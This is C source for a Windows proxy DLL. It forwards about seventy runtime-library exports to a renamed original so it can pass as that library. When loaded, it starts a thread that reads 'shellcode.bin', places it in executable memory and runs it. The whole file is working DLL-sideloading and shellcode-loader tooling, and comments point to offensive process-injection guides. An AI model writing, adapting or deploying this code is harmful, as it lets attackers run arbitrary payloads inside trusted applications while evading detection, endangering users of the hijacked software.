
#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:_CreateFrameInfo=tmp8F83._CreateFrameInfo,@1")
#pragma comment(linker, "/export:_CxxThrowException=tmp8F83._CxxThrowException,@2")
#pragma comment(linker, "/export:_FindAndUnlinkFrame=tmp8F83._FindAndUnlinkFrame,@3")
#pragma comment(linker, "/export:_IsExceptionObjectToBeDestroyed=tmp8F83._IsExceptionObjectToBeDestroyed,@4")
#pragma comment(linker, "/export:_SetWinRTOutOfMemoryExceptionCallback=tmp8F83._SetWinRTOutOfMemoryExceptionCallback,@5")
#pragma comment(linker, "/export:__AdjustPointer=tmp8F83.__AdjustPointer,@6")
#pragma comment(linker, "/export:__BuildCatchObject=tmp8F83.__BuildCatchObject,@7")
#pragma comment(linker, "/export:__BuildCatchObjectHelper=tmp8F83.__BuildCatchObjectHelper,@8")
#pragma comment(linker, "/export:__C_specific_handler=tmp8F83.__C_specific_handler,@9")
#pragma comment(linker, "/export:__C_specific_handler_noexcept=tmp8F83.__C_specific_handler_noexcept,@10")
#pragma comment(linker, "/export:__CxxDetectRethrow=tmp8F83.__CxxDetectRethrow,@11")
#pragma comment(linker, "/export:__CxxExceptionFilter=tmp8F83.__CxxExceptionFilter,@12")
#pragma comment(linker, "/export:__CxxFrameHandler=tmp8F83.__CxxFrameHandler,@13")
#pragma comment(linker, "/export:__CxxFrameHandler2=tmp8F83.__CxxFrameHandler2,@14")
#pragma comment(linker, "/export:__CxxFrameHandler3=tmp8F83.__CxxFrameHandler3,@15")
#pragma comment(linker, "/export:__CxxQueryExceptionSize=tmp8F83.__CxxQueryExceptionSize,@16")
#pragma comment(linker, "/export:__CxxRegisterExceptionObject=tmp8F83.__CxxRegisterExceptionObject,@17")
#pragma comment(linker, "/export:__CxxUnregisterExceptionObject=tmp8F83.__CxxUnregisterExceptionObject,@18")
#pragma comment(linker, "/export:__DestructExceptionObject=tmp8F83.__DestructExceptionObject,@19")
#pragma comment(linker, "/export:__FrameUnwindFilter=tmp8F83.__FrameUnwindFilter,@20")
#pragma comment(linker, "/export:__GetPlatformExceptionInfo=tmp8F83.__GetPlatformExceptionInfo,@21")
#pragma comment(linker, "/export:__NLG_Dispatch2=tmp8F83.__NLG_Dispatch2,@22")
#pragma comment(linker, "/export:__NLG_Return2=tmp8F83.__NLG_Return2,@23")
#pragma comment(linker, "/export:__RTCastToVoid=tmp8F83.__RTCastToVoid,@24")
#pragma comment(linker, "/export:__RTDynamicCast=tmp8F83.__RTDynamicCast,@25")
#pragma comment(linker, "/export:__RTtypeid=tmp8F83.__RTtypeid,@26")
#pragma comment(linker, "/export:__TypeMatch=tmp8F83.__TypeMatch,@27")
#pragma comment(linker, "/export:__current_exception=tmp8F83.__current_exception,@28")
#pragma comment(linker, "/export:__current_exception_context=tmp8F83.__current_exception_context,@29")
#pragma comment(linker, "/export:__intrinsic_setjmp=tmp8F83.__intrinsic_setjmp,@30")
#pragma comment(linker, "/export:__intrinsic_setjmpex=tmp8F83.__intrinsic_setjmpex,@31")
#pragma comment(linker, "/export:__processing_throw=tmp8F83.__processing_throw,@32")
#pragma comment(linker, "/export:__report_gsfailure=tmp8F83.__report_gsfailure,@33")
#pragma comment(linker, "/export:__std_exception_copy=tmp8F83.__std_exception_copy,@34")
#pragma comment(linker, "/export:__std_exception_destroy=tmp8F83.__std_exception_destroy,@35")
#pragma comment(linker, "/export:__std_terminate=tmp8F83.__std_terminate,@36")
#pragma comment(linker, "/export:__std_type_info_compare=tmp8F83.__std_type_info_compare,@37")
#pragma comment(linker, "/export:__std_type_info_destroy_list=tmp8F83.__std_type_info_destroy_list,@38")
#pragma comment(linker, "/export:__std_type_info_hash=tmp8F83.__std_type_info_hash,@39")
#pragma comment(linker, "/export:__std_type_info_name=tmp8F83.__std_type_info_name,@40")
#pragma comment(linker, "/export:__telemetry_main_invoke_trigger=tmp8F83.__telemetry_main_invoke_trigger,@41")
#pragma comment(linker, "/export:__telemetry_main_return_trigger=tmp8F83.__telemetry_main_return_trigger,@42")
#pragma comment(linker, "/export:__unDName=tmp8F83.__unDName,@43")
#pragma comment(linker, "/export:__unDNameEx=tmp8F83.__unDNameEx,@44")
#pragma comment(linker, "/export:__uncaught_exception=tmp8F83.__uncaught_exception,@45")
#pragma comment(linker, "/export:__uncaught_exceptions=tmp8F83.__uncaught_exceptions,@46")
#pragma comment(linker, "/export:__vcrt_GetModuleFileNameW=tmp8F83.__vcrt_GetModuleFileNameW,@47")
#pragma comment(linker, "/export:__vcrt_GetModuleHandleW=tmp8F83.__vcrt_GetModuleHandleW,@48")
#pragma comment(linker, "/export:__vcrt_InitializeCriticalSectionEx=tmp8F83.__vcrt_InitializeCriticalSectionEx,@49")
#pragma comment(linker, "/export:__vcrt_LoadLibraryExW=tmp8F83.__vcrt_LoadLibraryExW,@50")
#pragma comment(linker, "/export:_get_purecall_handler=tmp8F83._get_purecall_handler,@51")
#pragma comment(linker, "/export:_get_unexpected=tmp8F83._get_unexpected,@52")
#pragma comment(linker, "/export:_is_exception_typeof=tmp8F83._is_exception_typeof,@53")
#pragma comment(linker, "/export:_local_unwind=tmp8F83._local_unwind,@54")
#pragma comment(linker, "/export:_purecall=tmp8F83._purecall,@55")
#pragma comment(linker, "/export:_set_purecall_handler=tmp8F83._set_purecall_handler,@56")
#pragma comment(linker, "/export:_set_se_translator=tmp8F83._set_se_translator,@57")
#pragma comment(linker, "/export:longjmp=tmp8F83.longjmp,@58")
#pragma comment(linker, "/export:memchr=tmp8F83.memchr,@59")
#pragma comment(linker, "/export:memcmp=tmp8F83.memcmp,@60")
#pragma comment(linker, "/export:memcpy=tmp8F83.memcpy,@61")
#pragma comment(linker, "/export:memmove=tmp8F83.memmove,@62")
#pragma comment(linker, "/export:memset=tmp8F83.memset,@63")
#pragma comment(linker, "/export:set_unexpected=tmp8F83.set_unexpected,@64")
#pragma comment(linker, "/export:strchr=tmp8F83.strchr,@65")
#pragma comment(linker, "/export:strrchr=tmp8F83.strrchr,@66")
#pragma comment(linker, "/export:strstr=tmp8F83.strstr,@67")
#pragma comment(linker, "/export:unexpected=tmp8F83.unexpected,@68")
#pragma comment(linker, "/export:wcschr=tmp8F83.wcschr,@69")
#pragma comment(linker, "/export:wcsrchr=tmp8F83.wcsrchr,@70")
#pragma comment(linker, "/export:wcsstr=tmp8F83.wcsstr,@71")


DWORD WINAPI DoMagic(LPVOID lpParameter)
{
	//https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer
	FILE* fp;
	size_t size;
	unsigned char* buffer;

	fp = fopen("shellcode.bin", "rb");
	fseek(fp, 0, SEEK_END);
        size = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        buffer = (unsigned char*)malloc(size);
	
	//https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
        fread(buffer, size, 1, fp);

        void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        memcpy(exec, buffer, size);

        ((void(*) ())exec)();

	return 0;
}

    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD ul_reason_for_call,
        LPVOID lpReserved
    )
    {
        HANDLE threadHandle;

        switch (ul_reason_for_call)
        {
            case DLL_PROCESS_ATTACH:
		// https://gist.github.com/securitytube/c956348435cc90b8e1f7
                // Create a thread and close the handle as we do not want to use it to wait for it 
                threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
                CloseHandle(threadHandle);

            case DLL_THREAD_ATTACH:
                break;
            case DLL_THREAD_DETACH:
                break;
            case DLL_PROCESS_DETACH:
                break;
        }
        return TRUE;
    }



